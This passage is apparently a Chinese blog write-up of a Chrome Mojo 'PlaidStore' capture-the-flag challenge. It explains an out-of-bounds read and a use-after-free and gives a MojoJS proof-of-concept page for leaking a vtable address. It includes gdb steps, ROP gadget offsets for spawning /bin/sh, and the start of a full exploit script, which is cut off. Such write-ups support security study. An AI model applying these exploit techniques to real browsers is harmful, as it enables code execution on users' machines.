将传入的count作为数据的获取量，返回count单位的数据</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() count)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::move(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="c-UAF漏洞">c. UAF漏洞</h3>
+<ul>
+<li>
+<p>当<code>PlaidStoreImpl</code>类执行构造函数时，该类的一个实例将会<strong>保存</strong>传入的<code>render_frame_host</code><strong>原始指针</strong>。（注意保留的是<strong>原始</strong>指针<strong>而不是智能指针</strong>）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PlaidStoreImpl::PlaidStoreImpl(</span><br><span class="line">        RenderFrameHost *render_frame_host)</span><br><span class="line">        : render_frame_host_(render_frame_host) &#123;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>而<code>PlaidStoreImpl::Create</code>函数内部会调用<code>mojo::MakeSelfOwnedReceiver</code>函数。该函数将会把Mojo管道的一端<code>Receiver</code>与当前<code>PlaidStoreImpl</code>实例关联（注意传入的<code>render_frame_host</code>使用的 <strong><code>unique</code>智能指针类型为<code>PlaidStoreImpl</code></strong>）。这样，当Mojo管道关闭或者发生错误，<code>recevier</code>便可将当前<code>PlaidStoreImpl</code>实例释放。如此便达到了关联<code>PlaidStoreImpl</code>生命周期的目的。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                                <span class="built_in">std</span>::move(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是，<code>render_frame_host</code>并没有与当前<code>PlaidStoreImpl</code>实例关联。也就是说若<code>render_frame_host</code>被析构，当前<code>PlaidStoreImpl</code>实例将仍然存在。</p>
+<blockquote>
+<p>一个<code>render</code>进程中的<code>RenderFrame</code>对应<code>browser</code>进程中的<code>RenderFrameHost</code>。</p>
+<p>当打开新的tab或iframe时，<code>browser</code>将会对应的创建<code>RenderFrameHost</code>对象</p>
+<p>释放也是如此，<strong>当某个tab或iframe被释放时，对应的<code>RenderFrameHost</code>对象将会被释放</strong>。</p>
+<p>参考：<a href="https://blog.csdn.net/luoshengyang/article/details/50450100?biz_id=102&amp;utm_term=renderFrameHost&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-50450100&amp;spm=1018.2118.3001.4187" target="_blank" rel="noopener">Chromium网页Frame Tree创建过程分析</a></p>
+</blockquote>
+<p>这样，我们可以在保证<code>Mojo Pipe</code>不断开的前提下，将<code>render_frame_host</code>析构，之后就可以在<code>PlaidStoreImpl</code>类函数中继续使用<code>render_frame_host</code>，以达到UAF的目的。</p>
+<blockquote>
+<p>总结：</p>
+<ol>
+<li>
+<p>若关闭Mojo管道，则<code>PlaidStoreImpl</code>实例将会被析构；</p>
+</li>
+<li>
+<p>若析构<code>render_frame_host</code>，则对应<code>PlaidStoreImpl</code>实例将仍然存在。</p>
+</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h2 id="5-调试与利用过程">5. 调试与利用过程</h2>
+<h3 id="a-OOB">a. OOB</h3>
+<ul>
+<li>
+<p>我们先写一段OOB POC，看看会泄露出什么信息。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// OOB漏洞测试</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">oob</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"OOB"</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 获取plaidStore实例</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 将plaidStore实例与mojo pipe绑定</span></span></span><br><span class="line">        Mojo.bindInterface(</span><br><span class="line"><span class="actionscript">            blink.mojom.PlaidStore.name,            <span class="comment">// interfaceName</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 建立mojo pipe，并返回该管道的handle</span></span></span><br><span class="line"><span class="actionscript">            mojo.makeRequest(plaidStorePtr).handle, <span class="comment">// request_handle</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">"context"</span>,                              <span class="comment">// scope</span></span></span><br><span class="line"><span class="actionscript">            <span class="literal">true</span>);                                  <span class="comment">// userBroserInterfaceBroker</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// plaidStore中存储的是int8类型的值。本次填充0x10个元素</span></span></span><br><span class="line"><span class="actionscript">        plaidStorePtr.storeData(<span class="string">"aaaa"</span>, [<span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>,</span></span><br><span class="line">            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48]);</span><br><span class="line"><span class="actionscript">        <span class="comment">// getData接口返回Promise对象，需要获取其中的PromiseValue</span></span></span><br><span class="line"><span class="javascript">        plaidStorePtr.getData(<span class="string">"aaaa"</span>, <span class="number">0x18</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 返回的数组元素是int8类型</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 对数组使用slice函数，取数组的第0x20至0x50个的元素</span></span></span><br><span class="line">            success(dec2hex(bytes2DWORD(res.data.slice(0x10, 0x18))));</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    oob();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>启动调试器后，先在<code>PlaidStoreImpl::Create</code>函数上下个断点</p>
+<p><img src="/2020/10/mojo/breakCreate.png" alt="img"></p>
+<p>之后执行<code>run</code>，断在<code>PlaidStoreImpl::Create</code>函数内部。在这里我们可以注意到，<code>PlaidStoreImpl</code>的大小为0x28bytes。</p>
+<p><img src="/2020/10/mojo/sizeofPlaidStore.png" alt="img"></p>
+<blockquote>
+<p>为什么<code>sizeof(PlaidStoreImpl) == 0x28</code>呢？因为下一个要执行的函数是<code>operator new</code>。而这个<code>0x28</code>正是传入的内存大小。</p>
+<p>如何知道那个<code>0x555xxxxx</code>函数是<code>operator new</code>呢？先单步跟踪进去，然后一个<code>frame</code>指令，或者将函数调用链打印出来的<code>bt</code>指令。第一个函数就是。</p>
+<p><img src="/2020/10/mojo/operatorNew.png" alt="img"></p>
+<p>再一个简单的方法就是使用<code>c++filt</code>命令，将<code>name mangling</code>后的函数名称还原回先前的函数名称。</p>
+<p><img src="/2020/10/mojo/cppfilt.png" alt="img"></p>
+</blockquote>
+<p>同时，当<code>operator new</code>函数执行完成后，返回的<code>%rax</code>地址即为<code>PlaidStoreImpl</code>的地址。使用<code>set $ps_addr = $rax</code> gdb命令将该地址存储到gdb的临时变量中。之后直接执行<code>finish</code>命令，跳过该函数剩余的构造<code>PlaidStoreImpl</code>实例的过程（该过程包括但不限于<strong>设置虚表地址等</strong>）。</p>
+<p><img src="/2020/10/mojo/storePsAddr.png" alt="img"></p>
+</li>
+<li>
+<p><code>fini</code>命令之后，我们先看一下<code>PlaidStoreImpl</code>实例的内存布局（相关成员均标注在图片上）</p>
+<p><img src="/2020/10/mojo/plaidStoreImplMap.png" alt="img"></p>
+<blockquote>
+<p>C++的编译器保证虚函数表的指针存在于对象实例中<strong>最前面</strong>的位置。</p>
+</blockquote>
+</li>
+<li>
+<p>我们看一下<code>map</code>的相关内存结构，看看到底泄露的是什么地址 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/map;l=898;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;bpv=0;bpt=1" target="_blank" rel="noopener">chrome std::map 源码</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">LIBCPP_TEMPLATE_VIS</span> <span class="title">map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">typedef</span> __tree&lt;__value_type, __vc, __allocator_type&gt;   __base;</span><br><span class="line">    __base __tree_;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>众所周知，map内部使用<code>rb_tree</code>，因此我们继续点进去看看 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/__tree;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;bpv=0;bpt=1;l=979" target="_blank" rel="noopener">chrome std::tree 源码</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Compare</span>, <span class="title">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp                                      value_type;</span><br><span class="line">    <span class="keyword">typedef</span> _Compare                                 value_compare;</span><br><span class="line">    <span class="keyword">typedef</span> _Allocator                               allocator_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">typedef</span> allocator_traits&lt;allocator_type&gt;         __alloc_traits;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> __make_tree_node_types&lt;value_type,</span><br><span class="line">        <span class="keyword">typename</span> __alloc_traits::void_pointer&gt;::type</span><br><span class="line">                                                    _NodeTypes;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeTypes::__parent_pointer      __parent_pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeTypes::__iter_pointer        __iter_pointer;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    __iter_pointer                                     __begin_node_;</span><br><span class="line">    __compressed_pair&lt;<span class="keyword">__end_node_t</span>, __node_allocator&gt;  __pair1_;</span><br><span class="line">    __compressed_pair&lt;size_type, value_compare&gt;        __pair3_;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，该tree有三个成员变量，而第一个pointer指向的是根结点。tree成员变量的数量也与我们<code>PlaidStoreImpl</code>内存布局所对应。</p>
+</li>
+<li>
+<p>我们再看看tree第一个pointer所指向的<strong>叶结点的成员变量</strong>有哪些 - <a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/__tree;drc=ce29422a5a0922393f61efe899ec80e9894e09ed;l=751" target="_blank" rel="noopener">chrome tree_node 源码</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_end_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Pointer pointer;</span><br><span class="line">    pointer __left_;</span><br><span class="line">  <span class="comment">// ....</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node_base</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base_types&lt;_VoidPtr&gt;::__end_node_type</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__node_base_pointer pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__parent_pointer __parent_pointer;</span><br><span class="line"></span><br><span class="line">    pointer          __right_;</span><br><span class="line">    __parent_pointer __parent_;</span><br><span class="line">    <span class="keyword">bool</span> __is_black_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base&lt;_VoidPtr&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp __node_value_type;</span><br><span class="line">    __node_value_type __value_;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>即，一个<code>__tree_node</code>实例有以下五个成员，分别是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pointer             __left_;</span><br><span class="line">pointer             __right_;</span><br><span class="line">__parent_pointer    __parent_;</span><br><span class="line"><span class="keyword">bool</span>                __is_black_;</span><br><span class="line">__node_value_type   __value_;   <span class="comment">// `__node_value_type`在这里是`pair&lt;string, vector&lt;uint8_t&gt;&gt;`</span></span><br></pre></td></tr></table></figure>
+<p>最后，我们查看一下<code>__tree_node</code>内存布局</p>
+<blockquote>
+<p>在查看内存布局前，先令chrome执行完<code>PlaidStoreImpl::storeData</code>函数，将数据存入tree，方便调试。</p>
+</blockquote>
+<p><img src="/2020/10/mojo/treeNodeMap.png" alt="img"></p>
+<blockquote>
+<p>图中红色框的0x30字节为<code>__value__</code>成员变量。其中，前0x18个字节是<code>string</code>类实例（注意那个<code>0x0000000061616161</code>，这正是填入的keyString<code>1111</code>），后0x18字节是<code>vector</code>类实例。</p>
+</blockquote>
+</li>
+<li>
+<p>而<code>vector</code>成员变量如下，该类共有三个成员，这里我们只关心<code>__begin_</code>成员所指向的内存。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> _<span class="title">LIBCPP_TEMPLATE_VIS</span> <span class="title">vector</span>&lt;bool, _Allocator&gt;</span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">private</span> __vector_base_common&lt;<span class="literal">true</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    __storage_pointer                                      __begin_;</span><br><span class="line">    size_type                                              __size_;</span><br><span class="line">    __compressed_pair&lt;size_type, __storage_allocator&gt; __cap_alloc_;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<p>以下是该vector所指向的内存位置，可以看到前0x10个字节的值是先前执行<code>PlaidStore::storeData</code>函数时写入的。而我们可以通过该<code>vector</code>越界向后读取。</p>
+<p><img src="/2020/10/mojo/vectorMap.png" alt="img"></p>
+</li>
+</ul>
+<blockquote>
+<p>为什么要这么大动干戈，从上向下查找<code>vector</code>的泄露地址呢？因为我们需要寻找一下，<strong>这个地址是否与其他已经获得的地址之间存在关系</strong>。</p>
+<p>在这题中，我们可以确认<code>vecotr __begin_</code>与<code>PlaidStoreImpl</code>地址位于同一个段。</p>
+</blockquote>
+<ul>
+<li>
+<p>那么，该越界读取什么来泄露信息，泄露什么信息呢？</p>
+<p>由于<code>PlaidStore</code>实例与<code>vector __begin_</code>所指向的地址<strong>位于同一个段</strong>。同时，<code>PlaidStore</code>实例中存在虚表，因此我们可以通过<code>vector</code>来越界读取<code>PlaidStore vtable</code>地址。这样就可以通过虚表地址确定一系列的地址（包括但不限于确定ELF基地址等）。</p>
+<blockquote>
+<p>类实例的虚表位于<code>rodata</code>段中，也就是说，<code>vtable</code>地址与<strong>ELF基地址</strong>的相对偏移是保持不变的。</p>
+</blockquote>
+<p><img src="/2020/10/mojo/vmmap.png" alt="img"></p>
+<p>我们需要大量分配<code>PlaidStoreImpl</code>与<code>vector</code>，使它们呈线性交替存放，之后就可以通过越界读来<strong>获取虚表地址</strong>。</p>
+<blockquote>
+<p>注意虚表地址中的后三个十六进制数<code>0x7a0</code>，我们将通过这个来识别读取到的数据是否是虚表地址，而不是采用相对偏移的方式来读取，这样就可以最大程度上避免<strong>由于内存分配器的不同而导致的偏移差异</strong>。</p>
+</blockquote>
+<p>而虚表与chrome基地址的偏移为<code>0x000055555f50a7a0 - 0x555555554000 == 0x9fb67a0</code>，获取虚表地址后就可以通过相对偏移来计算出ELF基地址。</p>
+<p><img src="/2020/10/mojo/chromeBaseOffset.png" alt="img"></p>
+<p>ELF基地址有了之后，我们就可以以下命令来获取一系列<code>gadgets</code>地址。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./chrome &gt; gadgets.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于chrome文件过大，执行该命令时需要<strong>4GB内存</strong>左右</p>
+<p>建立出的<code>gadgets.txt</code>的文件大小将近<strong>400MB</strong>。</p>
+</blockquote>
+<p>这样就可以获取到以下gadget的相对偏移</p>
+<blockquote>
+<p>这些gadgets组合在一起便可<strong>劫持栈</strong>，并利用<code>syscall</code>执行<code>/bin/sh</code></p>
+</blockquote>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000880dee8</span> : <span class="keyword">xchg</span> <span class="built_in">rax</span>, <span class="built_in">rsp</span> <span class="comment">; clc ; pop rbp ; ret</span></span><br><span class="line"><span class="number">0x0000000002e4630f</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002d278d2</span> : <span class="keyword">pop</span> <span class="built_in">rsi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002e9998e</span> : <span class="keyword">pop</span> <span class="built_in">rdx</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002e651dd</span> : <span class="keyword">pop</span> <span class="built_in">rax</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000002ef528d</span> : <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>所以最终，我们编写以下代码来泄露我们的目标地址</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJS接口时一定要将这些js包含入html中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/mojo/public/js/mojo_bindings.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">dec2hex</span><span class="params">(dec)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + dec.toString(<span class="number">16</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bytes2DWORD</span><span class="params">(bytes)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            value = value * 0x100 + bytes[7 - i];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> value;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">(msg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + msg);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerText += <span class="string">'[+] '</span> + msg + <span class="string">'\n'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> plaidStorePtrList = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span 